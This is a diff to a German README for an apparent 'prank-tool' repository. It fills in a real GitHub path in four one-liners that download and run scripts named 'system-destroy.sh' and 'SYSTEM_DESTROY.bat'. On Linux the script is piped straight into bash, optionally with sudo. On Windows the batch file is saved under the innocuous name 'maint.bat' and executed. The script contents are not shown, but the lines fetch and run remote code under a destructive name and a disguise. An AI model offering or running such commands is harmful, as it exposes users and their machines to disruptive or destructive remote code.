@@ -21,14 +21,14 @@ Am Ende:
 ## Linux
 
 ```bash
-curl -sL https://raw.githubusercontent.com/<USER>/<REPO>/main/system-destroy.sh | bash
+curl -sL https://raw.githubusercontent.com/nekuro22/prank-tool/main/system-destroy.sh | bash
 ```
 
 Der Reboot-Teil braucht `root`/`sudo` – ohne passiert nichts, der Rest läuft
 trotzdem. Für den echten Reboot:
 
 ```bash
-curl -sL https://raw.githubusercontent.com/<USER>/<REPO>/main/system-destroy.sh | sudo bash
+curl -sL https://raw.githubusercontent.com/nekuro22/prank-tool/main/system-destroy.sh | sudo bash
 ```
 
 ## Windows
@@ -36,13 +36,13 @@ curl -sL https://raw.githubusercontent.com/<USER>/<REPO>/main/system-destroy.sh 
 PowerShell:
 
 ```powershell
-curl.exe -sL -o "$env:TEMP\maint.bat" https://raw.githubusercontent.com/<USER>/<REPO>/main/SYSTEM_DESTROY.bat; & "$env:TEMP\maint.bat"
+curl.exe -sL -o "$env:TEMP\maint.bat" https://raw.githubusercontent.com/nekuro22/prank-tool/main/SYSTEM_DESTROY.bat; & "$env:TEMP\maint.bat"
 ```
 
 CMD:
 
 ```bat
-curl -sL -o "%TEMP%\maint.bat" https://raw.githubusercontent.com/<USER>/<REPO>/main/SYSTEM_DESTROY.bat && "%TEMP%\maint.bat"
+curl -sL -o "%TEMP%\maint.bat" https://raw.githubusercontent.com/nekuro22/prank-tool/main/SYSTEM_DESTROY.bat && "%TEMP%\maint.bat"
 ```
 
 ---
